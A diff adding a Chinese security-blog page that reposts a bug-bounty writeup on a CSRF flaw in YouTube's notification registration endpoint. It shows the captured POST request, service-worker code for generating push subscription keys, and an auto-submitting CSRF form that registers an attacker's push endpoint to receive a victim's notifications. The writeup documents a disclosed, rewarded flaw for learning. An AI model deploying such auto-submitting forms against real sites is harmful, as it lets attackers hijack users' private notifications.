@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享  从POST请求中发现端倪某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【转]CSRF漏洞劫持Youtube用户的通知消息">
+<meta property="og:url" content="http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享  从POST请求中发现端倪某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png">
+<meta property="og:image" content="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png">
+<meta property="og:updated_time" content="2019-12-06T17:54:16.287Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【转]CSRF漏洞劫持Youtube用户的通知消息">
+<meta name="twitter:description" content="大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享  从POST请求中发现端倪某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经">
+<meta name="twitter:image" content="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【转]CSRF漏洞劫持Youtube用户的通知消息</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2019/12/07/精品文章/CVE-2017-7269 IIS6.0远程代码执行漏洞复现/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2019/12/07/漏洞搜集/犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&text=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&is_video=false&description=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【转]CSRF漏洞劫持Youtube用户的通知消息&body=Check out this article: http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&name=【转]CSRF漏洞劫持Youtube用户的通知消息&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&t=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析Service-Worker-服务工作线程​"><span class="toc-number">1.</span> <span class="toc-text">分析Service Worker 服务工作线程​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造CSRF攻击框架​"><span class="toc-number">2.</span> <span class="toc-text">构造CSRF攻击框架​</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【转]CSRF漏洞劫持Youtube用户的通知消息
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-06T17:03:10.542Z" itemprop="datePublished">2019-12-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/漏洞/">漏洞</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg" alt></p>
+<p>大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享</p>
+<p><strong> 从POST请求中发现端倪</strong><br>某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经是半夜00:30了，困累之极…..。我就随便点点打开了YouTube的通知服务（Notification），其中的POST请求引起了我的注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /notifications_ajax?action_register_device=1 HTTP/1.1</span><br><span class="line">Host: www.youtube.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://www.youtube.com/sw.js</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41184676334</span><br><span class="line">Origin: https://www.youtube.com</span><br><span class="line">Content-Length: 1459</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: duh, cookies!</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;endpoint&quot;</span><br><span class="line"></span><br><span class="line">https://updates.push.services.mozilla.com/wpush/v1/gAAA...</span><br><span class="line"></span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;device_id&quot;</span><br><span class="line">dbe8453d99714c6160994fdf5bb3c59332df04278a...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;p256dh_key&quot;</span><br><span class="line">BBNVkVOt6tpY1KvJJqtLvqt...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;auth_key&quot;</span><br><span class="line">V5-_lh6nYT2zoY...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;permission&quot;</span><br><span class="line">granted</span><br><span class="line">-----------------------------41184676334--</span><br></pre></td></tr></table></figure></p>
+<p> 乍一看，为了防止CSRF，其中的auth_key、p256dh_key、endpoint、device_id等参数貌似都是经过编码的字符串，但仔细一分析才知道，这些所有的参数都是由其中updates.push.services.mozilla.com的Mozilla通知推送服务产生的，所以，这样初略来看，该接口上不存在CSRF漏洞。</p>
+<h3 id="分析Service-Worker-服务工作线程​"><a href="#分析Service-Worker-服务工作线程​" class="headerlink" title="分析Service Worker 服务工作线程​"></a>分析Service Worker 服务工作线程​</h3><p>深入分析可知，上述POST请求中的referrer字段值为“<a href="https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service" target="_blank" rel="noopener">https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service</a> Worker）。</p>
+<p>Service Worker 是独立于当前页面的一段运行在浏览器后台进程里的脚本。Service Worker不需要用户打开 web 页面，也不需要其他交互，异步地运行在一个完全独立的上下文环境，不会对主线程造成阻塞。基于Service Worker可以实现消息推送、离线缓存和后台同步API等功能，本质上来说，Service Worker充当了Web应用程序与浏览器之间的代理。​</p>
+<p>也就是说，referrer字段中的sw.js发起了这个POST请求，以至于这个请求和其它具备CSRF防御机制的YouTube请求内容存在不同。</p>
+<h3 id="构造CSRF攻击框架​"><a href="#构造CSRF攻击框架​" class="headerlink" title="构造CSRF攻击框架​"></a>构造CSRF攻击框架​</h3><p>到了这一步，从这些参数里，我隐约觉得这里应该会有漏洞出现，但总要构造个PoC出来试试看。因此，通过研究以上参数的生成机制，我利用sw.js原理，编写了以下三个代码文件，构建了一个本地服务端来生成其中的各个参数。 </p>
+<p><strong>index.html:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Push Demo&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;index.css&quot; /&gt;</span><br><span class="line">    &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;permission-btn&quot; onclick=&quot;main()&quot;&gt;Ask Permission&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">index.js：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const check = () =&gt; &#123;</span><br><span class="line">  if (!(&apos;serviceWorker&apos; in navigator)) &#123;</span><br><span class="line">    throw new Error(&apos;No Service Worker support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!(&apos;PushManager&apos; in window)) &#123;</span><br><span class="line">    throw new Error(&apos;No Push API Support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const registerServiceWorker = async () =&gt; &#123;</span><br><span class="line">  const swRegistration = await navigator.serviceWorker.register(&apos;sw.js&apos;)</span><br><span class="line">  return swRegistration</span><br><span class="line">&#125;</span><br><span class="line">const requestNotificationPermission = async () =&gt; &#123;</span><br><span class="line">  const permission = await window.Notification.requestPermission()</span><br><span class="line">  if (permission !== &apos;granted&apos;) &#123;</span><br><span class="line">    throw new Error(&apos;Permission not granted for Notification&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const main = async () =&gt; &#123;</span><br><span class="line">  check()</span><br><span class="line">  const swRegistration = await registerServiceWorker()</span><br><span class="line">  const permission = await requestNotificationPermission()</span><br><span class="line">&#125;</span><br><span class="line">sw.js：</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, async () =&gt; &#123;   console.log(&quot;Hello&quot;);</span><br><span class="line">      self.registration.pushManager.subscribe()</span><br><span class="line">  .then(function(subscription) &#123;</span><br><span class="line">          console.log(JSON.stringify(subscription));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&quot;push&quot;, function(event) &#123;</span><br><span class="line">  if (event.data) &#123;</span><br><span class="line">    console.log(&quot;Push event!! &quot;, event.data.text());</span><br><span class="line">    showLocalNotification(&quot;Yolo&quot;, event.data.text(),  self.registration);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&quot;Push event but no data&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">const showLocalNotification = (title, body, swRegistration) =&gt; &#123;</span><br><span class="line">  const options = &#123;</span><br><span class="line">    body</span><br><span class="line">    // here you can add more properties like icon, image, vibrate, etc.</span><br><span class="line">  &#125;;</span><br><span class="line">  swRegistration.showNotification(title, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这三个代码文件的目的在于获取sw.js请求时生成的各个参数，有了这些参数，就可以间接形成通知（Notification），打开其中的index.html页面，点击Ask Permission按钮请求通知权限，后台调用sw.js脚本，通过内置的Firefox API形成一个本地的通知服务端，通知请求提交时，我们就能获取到其中的各个参数。利用这些参数，可以进一步构造出CSRF攻击框架，就能获取到对应的通知消息。<br>在本地loclalhost构造这种通知请求服务端，需要用到Service Worker 服务工作线程（sw.js）的部署原理，其中涉及服务注册、激活、缓存控制和相关响应机制，具体可参考：developer.mozilla.org和developers.google.com中的详细介绍说明。</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png" alt></p>
+<p>综合上述分析，基于我们之前创建的本地通知服务端，结合Youtube的通知请求提交方式，我构造了以下CSRF攻击框架：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.youtube.com/notifications_ajax?action_register_device=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;device_id&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;permission&quot; value=&quot;granted&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;endpoint&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;p256dh_key&quot; value=&quot;replace=&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;auth_key&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>让我意想不到的是，我在其中以其他Youtube账号身份，利用获取到的各种请求参数，提交了通知请求，竟然能有效实施通知消息的CSRF攻击。也就是说，我们现在可以劫持到其他Youtube账号的消息推送接口（PUSH webhook），以其他Youtube账号身份收取到Youtube响应该账号的相关通知，这些通知可能是他订阅的某个频道或视频的更新消息，也可能是他私人视频的观众评论等，如下：</p>
+<p><img src="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png" alt></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析Service-Worker-服务工作线程​"><span class="toc-number">1.</span> <span class="toc-text">分析Service Worker 服务工作线程​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造CSRF攻击框架​"><span class="toc-number">2.</span> <span class="toc-text">构造CSRF攻击框架​</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&text=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&is_video=false&description=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【转]CSRF漏洞劫持Youtube用户的通知消息&body=Check out this article: http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&title=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&name=【转]CSRF漏洞劫持Youtube用户的通知消息&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/&t=【转]CSRF漏洞劫持Youtube用户的通知消息"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
